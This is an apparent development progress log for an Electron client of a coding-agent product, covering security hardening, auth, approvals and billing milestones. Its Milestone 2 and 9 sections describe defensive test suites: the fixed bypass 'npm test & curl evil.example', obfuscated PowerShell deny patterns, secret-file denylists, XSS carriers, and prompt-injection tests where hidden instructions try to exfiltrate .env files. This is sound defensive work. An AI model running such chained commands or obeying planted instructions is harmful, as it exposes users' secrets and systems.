# Ufuk — Progress

## 2026-09-23 — Milestone 9: Hardening pass

### What was done

- **Malicious output suite extended** (+7 adversarial markdown tests):
  SVG with embedded script, iframe srcdoc, form/input/base/meta-refresh
  carriers, `javascript:`/`data:text/html` img srcs, autofocus/onfocus,
  mixed-case `<ScRiPt>` + null-byte payloads — nothing executes, links
  never navigate.
- **Navigation & window.open blocking e2e** (+2): renderer attempts
  (anchor click + `location.assign`) keep the app on its own URL;
  IPC payloads are zod-validated in main (schema-violating chat:send and
  settings:set rejected with `invalid_request`).
- **Sender checks** (node): `isTrustedSender` accepts only file:// (packaged)
  and localhost dev-server origins; rejects remote, about:blank,
  chrome-extension and invalid URLs. `parseExternalUrl` rejects 10+
  schemes (javascript mixed-case, data, vbscript, file, ms-msdt,
  search-ms, shell, intent, ws).
- **Secrets hygiene**: no IPC channel name or payload shape carries
  tokens; the encrypted token file never contains plaintext (at-rest
  assertion); safeStorage failure path: plain fallback flagged in
  session info (`usingPlainTokenStore`), corrupt files force re-login
  without crashing. `auth:session` now surfaces the fallback flag.
- **Audits**:
  - `pip-audit` (backend venv): **no known vulnerabilities**.
  - `pnpm audit` (workspace): **2 moderate** — GHSA-82fw-gwwq-j7x9
    (Vitest path traversal via @vitest/mocker redirect mock, vitest
    ≥2.1.0 <4.1.11). DevDependency only (test runner; not shipped in the
    app or installer). Accepted risk; upgrade vitest to ≥4.1.11 as a
    follow-up (major-version jump deferred to avoid destabilizing 466+
    tests mid-project).

### Test counts

- frontend: **128 unit** (15 files; +17) + **11 e2e** (+2)
- evren-agent: 237, evren-backend: 115 (untouched)
- lint + typecheck clean

### Commits

- outer repo: M9 hardening suite + audit results

## 2026-09-23 — Milestone 8: Tiers, credits, errors

### What was done

**evren-agent (nested repo, commit d65c0cb):**
- `GatewayModelInfo.upstreamProvider` parsed from `/v1/models` details
  (mock + test updated) — powers the "real upstream provider/model"
  popover.

**frontend:**
- **Tier selector (live catalog)**: `models:list` IPC combines
  `/v1/models` (allowed tiers with display names, upstream provider/model,
  context window, max output) with the public `/plans` endpoint (tiers on
  other plans → shown 🔒-locked with "Not available on your plan
  (available on X)"). Details popover next to the selector. Falls back to
  the static fast/balanced/strong list when the catalog can't load.
- **Credit indicator** (`usage:get` → /usage): remaining/limit bar in the
  header (green → amber >70% → red >90%), plan name + period end + rpm in
  the tooltip, "no active subscription" badge on 403. Refreshed after
  every finished run (credits change).
- **Actionable chat errors**: the runtime attaches structured `errorInfo`
  to fatal error events (quota_exceeded, subscription_inactive,
  model_not_allowed, rate_limited + retryAfterMs, reauth_required,
  gateway_unreachable, upstream_unavailable, upstream_error, timeout —
  derived from ProviderError status/body, desktop-worded messages).
  `FriendlyErrorView` renders: quota → "nothing was charged" note;
  rate limit → LIVE countdown from Retry-After; session expired → "Log in
  again" button (single re-login via logout); unreachable → retry hint.
- `mapClientError` for the models/usage channels (reauth / unreachable /
  subscription_inactive codes); fixed `buildGatewaySession` to forward
  `fetchImpl` to `GatewayClient` (previously the client used the global
  fetch — caught by the new mocked-gateway test).

### Test counts

- evren-agent: 237 (agent-core 76 + local-runner 161; +0 net, field added)
- frontend: **111 unit** (14 files; +8) + **9 e2e**
- evren-backend: 115 (untouched)
- lint + typecheck clean

### Commits

- evren-agent: `feat(gateway): expose upstream_provider in GatewayModelInfo (desktop M8)`
- outer repo: M8 tiers/credits/errors + gitlink update

## 2026-09-23 — Milestone 7: Approvals, diffs, undo

### What was done

**evren-agent (nested repo, commit 6093fe1):**
- `ConversationStore.listToolCalls(id)` — per-conversation tool call records
  (SQLite + JSONL) → powers the changed-files list.
- `ShadowCheckpointStore.readFile(checkpointId, file)` — reads the
  pre-change snapshot content for the diff viewer (null for consumed
  checkpoints / files that did not exist before).

**frontend:**
- **Approval modal** (replaces the M6 bar): exact command or file path,
  working directory, display-only risk category (the permission engine
  remains the enforcer; denylist/dangerous floors apply regardless of the
  decision), the model's stated reason (assistant text streamed before the
  request) and the "always allow" pattern fetched from main
  (`approvals:preview` → the same `deriveRememberRule` the engine persists —
  single source of truth). Buttons: Allow once / Always allow (this
  project, pattern shown) / Deny.
- **Per-project permission mode**: stored in projects.json, falls back to
  the global setting; `auto-edits` = engine rules allowing write_file/
  edit_file (deny floors intact, commands still ask, no allow-everything
  mode). Switch lives in the new right panel.
- **Diff viewer**: LCS line diff computed in main
  (`electron/main/diff.ts`, context hunks, pathological-input full-replace
  cap), rendered inline or side-by-side, comparing the current file
  against its newest checkpoint snapshot (or an explicit checkpoint);
  `snapshotMissing` badge when the snapshot was consumed by undo/revert.
- **Changed files panel**: per-conversation list from recorded tool calls
  + live changes from the running turn; click opens the diff.
- **Checkpoint history**: newest first with per-file entries, Undo last
  change, Revert to checkpoint (both with confirmation), notes on results.
- Denied actions now STAY marked denied in the timeline even when the
  loop's failed `tool_result` arrives ("Permission denied …").
- 7 new IPC channels (approvals:preview, projects:set-permission-mode,
  checkpoints:list/undo/revert/diff, conversations:changed-files), all
  zod-validated and documented.

### Test counts

- evren-agent: **237 passed** (agent-core 76, local-runner 161; +2)
- frontend: **103 unit** (13 files; +11) + **9 e2e**
- evren-backend: 115 (untouched)
- lint + typecheck clean everywhere

### Commits

- evren-agent: `feat(store+checkpoints): listToolCalls + checkpoint readFile (desktop M7)`
- outer repo: M7 approvals/diffs/undo + gitlink update

## 2026-09-23 — Milestone 6: Chat and agent view

### What was done

**Main process** (`electron/main/agent-runtime.ts`): the agent runtime host,
wired exactly like the CLI's chat session —
`EvrenGatewayProvider` (tier alias from request/conversation/settings) +
`ToolRegistry` (file tools with `ShadowCheckpointStore`, run_command, git
tools) + `buildSystemPrompt` (reads `<root>/AGENT.md`) + `PermissionEngine`
(remembered rules live in the conversation store) + `Agent` with history
resumed from the store. One run per conversation; `stop()` aborts; finished
turns persist messages + tool calls + audit (partial work persists on
cancel, same as the CLI). All `AgentEvent`s stream to the renderer over the
`chat:event` push channel; gateway transport errors map through
`mapGatewayError` (quota / rate-limit / upstream messages).

- **Approval bridge** (basic M6 scope): the loop's `approval_request` is
  forwarded; the renderer answers via the new `approvals:respond` channel
  (Allow once / Always allow — rule derived with `deriveRememberRule` /
  Deny). Unanswered approvals are denied when the run ends.
- **Renderer** (`stores/chat.ts`): live per-conversation turn state —
  streaming text, reasoning, tool steps (name, args summary, result,
  duration, denied marker), file changes, usage, error. Buffers are capped
  (200k live chars, 4k step output, 12k rendered markdown with a
  "show all" toggle) so long outputs never freeze the UI.
- **Transcript** (upgraded): persisted history + live turn; reasoning
  collapsed and dimmed; collapsible tool-step timeline; per-turn token
  counter; error state with the friendly gateway messages.
- **Composer**: model selector (tier alias), Enter sends / Shift+Enter
  newline, Stop button, Retry (re-sends the last message), disabled while
  running. Global shortcuts: Esc stops the run, Ctrl+N new conversation.
- Copy button for the last assistant reply; the sidebar summary refreshes
  after each finished run (`reloadActive`).
- Debug scripts (`scripts/debug-launch.mjs`, `scripts/debug-chat.mjs`):
  isolated-userData launches; verified the runtime end to end (send →
  store lookup → error event through the bridge).

Note: the model's stated reason and the full approval modal (exact
command/path, cwd, risk category, pattern preview) land in Milestone 7.

### Test counts

- frontend: **92 unit** (11 files; +13 M6 tests) + **9 e2e**
- evren-agent: 235 (untouched), evren-backend: 115 (untouched)
- lint + typecheck clean

### Commits

- outer repo: M6 chat + agent view

## 2026-09-23 — Milestone 5: Projects and conversations

### What was done

**evren-agent (nested repo, commit 80cb0f0):**
- `ConversationStore` gained `renameConversation(id, title)` (trim + 200-char
  cap; rename wins over the first-user-message auto title) and
  `deleteConversation(id)` (messages + tool calls removed; JSONL log pruned
  by rewrite). Implemented in both SQLite and JSONL stores with a shared
  behavioral test suite (+2 tests × 2 stores).

**frontend:**
- **Main process** (`electron/main/projects.ts`): `ProjectManager` —
  validates added folders (real directory + `WorkspaceRoot` safety check,
  coded errors `not_a_directory`/`path_unsafe`), recent-projects JSON in
  userData, git-repo probe (`.git` existence), per-project conversation
  stores via `openConversationStore` (baseDir = userData/db; SQLite
  preferred, JSONL fallback under Electron 44 until an ABI-149 prebuild
  exists), store cache keyed by root, `requireKnownRoot` guard for
  renderer-supplied roots.
- **IPC**: 8 new channels (projects:list/add/remove/pick-folder,
  conversations:list/create/load/rename/delete), all zod-validated with
  documented request/response shapes in shared/channels.ts; ProjectValidationError
  maps to a coded error envelope.
- **Renderer**: `Sidebar` (projects with non-git warning + remove confirm;
  conversations with select-to-resume, inline rename (double-click or ✎),
  delete with confirm), `Transcript` (read-only persisted history through
  SafeMarkdown; tool rows compact), `MainShell` (Antigravity-inspired
  layout: left sidebar, main chat area, model selector + composer at the
  bottom — sending lands in M6), `stores/projects.ts` (Zustand).
- **e2e isolation fix**: Electron resolves appData via the Windows
  known-folder API — the APPDATA env override never worked, so the M4 e2e
  ack leaked into the real `%APPDATA%\Electron\settings.json`. Main now
  honors a `UFUK_USER_DATA_DIR` env override (`app.setPath`) and the e2e
  uses it; the leaked dev settings file was removed.
- New e2e: add project → list → create → rename → delete conversation
  through the REAL main-process stack (WorkspaceRoot + store engine).

### Test counts

- evren-agent: **235 passed** (agent-core 76, local-runner 159; +4)
- frontend: **79 unit** (10 files) + **9 e2e**
- evren-backend: 115 (untouched)
- lint + typecheck clean everywhere

### Commits

- evren-agent: `feat(store): rename/delete conversation (interface + sqlite + jsonl)`
- outer repo: M5 frontend + gitlink update

## 2026-09-23 — Milestone 4: Auth, settings, privacy

### What was done

- **PrivacyGate** (`src/screens/PrivacyGate.tsx`): first-run notice fetched
  from `/privacy/info` through the main process; explains that code and
  prompts go through the gateway to third-party providers, shows the
  upstream host/providers and the gateway's data-handling + account-deletion
  text; Continue stays disabled until the checkbox is ticked; acknowledging
  persists `privacyAcknowledged: true` (shown once). Unreachable backend →
  retryable error state with a Settings shortcut.
- **LoginScreen** (`src/screens/LoginScreen.tsx`): login + register modes
  (optional display name), loading states, logout in the shell, session
  restore via `/me` on startup. Errors map to friendly text via
  `src/ipc/errors.ts` (invalid_credentials / gateway_unreachable /
  registration_failed / reauth_required). Register enforces the backend's
  password rule (min 8) client-side too (schema updated).
- **SettingsDialog** (`src/components/SettingsDialog.tsx`): backend URL
  (http(s)-validated client-side, applied via settings:set — main rebuilds
  the gateway session), theme (dark default + light), default tier
  (fast/balanced/strong), permission mode (ask / auto-edits, explicitly no
  allow-everything). Escape closes.
- **App routing**: loading → privacy gate → login → main shell. Theme class
  toggling centralized in the store.
- **e2e**: smoke suite now runs the real flow against the local gateway
  (fresh APPDATA per run): gate acknowledges → login screen; skips
  gracefully (documented) if the backend is down.

### Test counts

- frontend: **62 unit** (8 files; +10 M4 DOM tests) + **8 e2e**
- evren-backend: 115 (untouched), evren-agent: 231 (untouched)
- lint + typecheck clean

### Commits

- outer repo: M4 auth/settings/privacy UI

## 2026-09-23 — Milestone 3: Frontend skeleton + security baseline

**Baseline:** agent 231 tests / backend 115 tests, all green.

### What was done

`frontend/` (product name **Ufuk**, package `ufuk`), wired into a root pnpm
workspace (`pnpm-workspace.yaml` includes `evren-agent/packages/*` +
`frontend`, so `@evren/agent-core` / `@evren/local-runner` are imported as
`workspace:*` — no forked logic; `evren-agent` keeps its own nested
workspace file and tests unchanged).

- **Stack:** electron-vite v5 (rolldown), Electron 44.4.3, React 18 +
  TypeScript strict (node/web split tsconfigs), Tailwind v4, Zustand,
  vitest (happy-dom for DOM tests, `@vitest-environment node` docblocks for
  main-process tests), Playwright Electron.
- **Architecture:** main process hosts the gateway session (GatewayAuth /
  GatewayClient from agent-core, rebuilt when the backend URL setting
  changes, token file namespaced per backend hash). Renderer is UI-only:
  `contextIsolation: true`, `nodeIntegration: false`, `sandbox: true`,
  `webSecurity: true`; all permission requests denied; ALL navigation
  blocked (single-page app; external links go through a confirmed
  `shell.openExternal` IPC); `window.open` denied via `setWindowOpenHandler`;
  `<webview>` attachment prevented; single-instance lock.
- **IPC contract:** `shared/channels.ts` (channel names, every channel
  documented) + `shared/ipc.ts` (zod schemas, `InvokeMap`/`EventMap`
  type-level tables, `IpcResult` envelope). Preload exposes exactly two
  functions (`invoke`/`subscribe`) with channel allowlists. Main re-validates
  every sender (`isTrustedSender`: own origin only) and zod-validates every
  payload. `chat:event` channel declared to freeze the contract for M5/6.
- **Tokens:** Electron safeStorage (DPAPI) `TokenStore` implementation
  (`tokens-<hash>.bin` per backend), plain-JSON flagged fallback when
  safeStorage is unavailable, corrupted-file handling forces re-login. The
  CLI file store keeps working; the app deliberately does NOT share CLI
  tokens (refresh rotation + reuse detection would revoke both).
- **CSP:** injected as a meta tag at build time by a vite plugin
  (`shared/csp.ts`): production is fully strict (`script-src 'self'`, no
  unsafe-inline/eval anywhere); dev only widens `style-src` (Vite HMR) and
  the HMR websocket.
- **Untrusted output:** `SafeMarkdown` (react-markdown + rehype-sanitize,
  default schema) — no raw HTML, links render as buttons that go through
  the confirmed openExternal IPC (http(s) only, enforced in main by
  `parseExternalUrl`), code blocks inert.
- **better-sqlite3:** kept external in the bundle; `rebuild:native` script
  (electron-builder install-app-deps) configured. See open issues.

### Bugs found and fixed while finishing the milestone

- **`electron` npm shim bundled into main+preload** (the app printed
  "Downloading Electron binary..." and died with "Unable to find Electron
  app at .../install.js"): electron-vite v5's `externalizeDepsPlugin()`
  only externalizes `dependencies`, and `electron` is a devDependency.
  Explicit `rollupOptions.external: ["electron", ...]` for main and preload
  fixes it. Regression-covered by the e2e suite (app must boot).
- **Security handlers registered too late:** `web-contents-created`
  handlers were attached inside `installSecurityDefaults(window)` after the
  window existed, so `setWindowOpenHandler`/`will-navigate` never applied
  to the main window. Now installed in `whenReady()` BEFORE the first
  window; e2e asserts window.open is blocked.
- zod v4 strictness: `z.string().email()` regex rejects 1-letter TLDs
  (tests now use realistic emails); `z.string().url()` accepts any scheme →
  `backendUrl` now requires http(s) via a refine; schema-internal `.options`
  poking replaced by behavioral enum tests.
- Gateway session helpers (`/me`, `/privacy/info`) used the global fetch →
  now use the session's injectable `fetchImpl` (testable without network).
- Renderer IPC client bound `window.ufuk` eagerly at import time (broke
  unit tests without a bridge) → lazy binding.

### Test counts

- frontend: **52 unit** (7 files) + **7 Playwright Electron e2e** (window
  opens, sandbox/node-leak checks, webPreferences baseline, strict CSP,
  window.open blocked, IPC round-trip, channel allowlist)
- evren-agent: 231 (untouched), evren-backend: 115 (untouched)
- lint + typecheck clean (eslint 9 flat config, prettier, two tsconfigs)

### Commits

- outer repo: `frontend/` skeleton + security baseline, root workspace
  files, README, docs

### Open issues / notes

- **better-sqlite3 cannot load under Electron 44 yet:** Electron 44 uses
  ABI 149; better-sqlite3 v12.11.1 publishes prebuilds only up to
  electron-v146, and this machine has no VS Build Tools (node-gyp fails).
  `rebuild:native` is configured for when either changes. The app therefore
  runs on the **JSONL fallback** (by design: `openConversationStore` prefers
  SQLite, falls back to JSONL — tested in local-runner). Revisit when
  better-sqlite3 ships ABI-149 prebuilds or install VS Build Tools.
- M4+ (login/settings/privacy UI, projects, chat) still to come; the M3
  shell only proves the security baseline end to end.

## 2026-09-22 — Milestone 2: Agent security suite

**Baseline:** agent 188 tests / backend 115 tests, all green.

### What was done

New adversarial suites in `evren-agent/packages/local-runner/test/`:

1. **`path-safety.adversarial.test.ts` (19 tests)** — `..\` traversal with
   mixed separators, absolute/UNC/admin-share/`\\?\` inputs, drive-letter
   case tricks, 8.3 short names, junctions/symlinks pointing outside,
   dangling symlinks, reserved device names, alternate data streams,
   trailing dots/spaces, very long paths (incl. escapes), case-insensitive
   denylist, `.env`/`*.pem`/`id_rsa*`/`.git/config` at any depth, plus
   tool-level (read/write) enforcement.
2. **`commands.adversarial.test.ts` (19 tests)** — obfuscated PowerShell
   (IEX variants, concatenation/backticks/env-indirection, encoded flags),
   download-and-execute, registry/disk/shutdown, deletion outside the
   workspace, cmd `/c` chaining, output flooding, hung processes, orphan
   grand-children, env listing; remembered-rule chaining bypass; approval
   handler sees the real command.
3. **`prompt-injection.test.ts` (5 tests)** — README/comment/tool-output
   hidden instructions; permission engine never bypassed; approval shows
   the real command; `.env` exfiltration surfaces for approval; unattended
   mode allowlist-only with floors intact.

### Bypasses found and fixed (all with regression tests)

- **ADS bypass**: `.env:hidden` / writes to `file.txt:stream` passed the
  denylist → alternate data stream syntax now rejected (any colon past the
  drive letter).
- **Trailing dot/space bypass**: `.env ` / `.env.` hit the real `.env` on
  disk while evading the denylist (Win32 strips them) → rejected.
- **Case bypass**: files created as `.ENV`/`SECRET.PEM` evaded the
  case-sensitive denylist on Windows → matching is now case-insensitive.
- **Reserved device names** (CON/NUL/COM1…) were unchecked → rejected
  before any fs access.
- **Remembered-rule chaining bypass**: `npm test & curl evil.example`
  auto-allowed by a remembered `npm test` prefix rule → chained commands
  now match exactly only.
- **Obfuscated execution**: plain `iex`/`Invoke-Expression` (not only after
  a download pipe), `& $env:…`, `[environment]::getenvironmentvariable`,
  `powershell -e <b64>`, `Format-Volume` spellings were not denied → new
  deny floors + a deobfuscation pass (backticks, string concatenation).
- `.git/config` added to the denylist; `cmd /c` wrappers get an ask floor;
  `\\?\`-prefixed inputs normalized instead of confusingly rejected.

Remaining limits documented honestly in `docs/SECURITY.md` (no OS sandbox,
deobfuscation is best-effort, shell commands can name denylisted files and
rely on the visible approval prompt, prompt injection is contained at the
permission engine, not at the model).

### Test counts

- evren-agent: **231 passed** (agent-core 76, local-runner 155; +43 new)
- evren-backend: 115 (untouched this milestone)

### Commits

- evren-agent (nested repo): security suite + fixes
- outer repo: gitlink update, docs/SECURITY.md, PROGRESS.md

## 2026-09-21 — Milestone 1: Backend fixes

**Baseline before:** agent 188 tests / backend 100 tests, all green
(verified fresh, see docs/STATUS.md).

### What was done

1. **Plan change no longer resets usage counters.** `assign_plan`
   (evren-backend/app/services/subscriptions.py) now inherits the current
   billing period when a subscription is active at assignment time: the new
   plan's limit applies to credits already used in that period. A fresh
   30-day period starts only when there is no active subscription. The Redis
   credit-ledger key (derived from `period_start.date()`) is preserved
   automatically, so concurrent-request protection carries over too.
   Rule documented in the function docstring, README (Credits section) and
   gateway-contract changelog (M9).
   - New regression tests: `tests/test_plan_change_usage.py` (5 tests):
     period+usage preserved on upgrade, **re-assigning the same plan does not
     reset the period** (the abuse vector), downgrade below usage → next
     request 402 with the upstream never called, expired subscription → fresh
     period, first assignment for a user without subscription.
2. **Credit rates are data, not code.** Rates were already DB columns
   (admin-editable); added the missing operator tooling and documentation:
   - `scripts/derive_credit_rates.py`: converts upstream USD/1M list prices
     into per-tier credit rates given margin and credits-per-USD; prints
     ready-to-use admin PATCH bodies. Placeholder prices only.
   - README "Credits" section: billing-period rule, rate-change semantics
     (future requests only), derivation formula
     `rate = usd_per_1k × credits_per_usd × (1 + margin)` with worked example.
   - `tests/test_derive_rates.py` (2 tests) pins the formula and the
     6-decimal HALF_UP quantization used by the gateway.
3. **OpenRouter switch by env only — verified.** No code path changed
   provider behavior; verified with a mocked OpenRouter-style upstream
   (`tests/test_openrouter_upstream.py`, 8 tests): usage in the final SSE
   chunk, `: OPENROUTER PROCESSING` comment lines, OpenRouter-style error
   bodies (numeric `code`), 429 with `X-RateLimit-Reset` verbose HTTP-date,
   `Retry-After` forwarded with correct precedence, env-only URL/auth-header
   switch (`Authorization: Bearer` / `X-API-Key`), failed requests never
   charged (usage row FAILED, credits 0, reserve released → next request
   still possible).
   - `app/services/upstream.py::_parse_resets_at` now also accepts HTTP-date
     strings (RFC 1123 via `email.utils.parsedate_to_datetime`, plus the
     verbose "…PM UTC" format some providers use) — previously only epoch
     seconds and ISO-8601.
   - `PROTECTED_USAGE_FIELDS` extended with `cost` (OpenRouter-style upstream
     USD cost) — stripped from client responses like the EVREN-private
     `usage.evren` object.
   - README section "Switching the upstream to OpenRouter (env only)" with
     seed overrides for tier model placeholders.
4. **Ops documentation.** `docs/backup-restore.md` (pg_dump/restore
   procedures, secrets handling, why Redis needs no backup, upgrade/rollback)
   and `docker-compose.prod.yml` + `deploy/Caddyfile` (no DB/Redis host
   ports, api unpublished, Caddy TLS reverse proxy for `UFUK_DOMAIN`,
   SSE-friendly settings, `restart: unless-stopped`). Merged config
   validated with `docker compose config` (needs Compose ≥ v2.24 for
   `!reset`). `.env.example` documents `UFUK_DOMAIN`. Not deployed.

### Test counts

- evren-backend: **115 passed** (100 before, +15 new)
- evren-agent: 188 (untouched this milestone)

### Open issues / notes

- Seeded credit rates (0.5/1.0, 1.5/3.0, 4.0/8.0) remain placeholder values —
  replace with derived rates before production (script provided).
- Renewal at period end is still manual (no background job): when a period
  expires the gateway returns 403 `subscription_inactive` until an admin
  assigns a plan again. Pre-existing behavior, documented in STATUS.md.
- The `.env` on this machine contains real secrets (never committed).
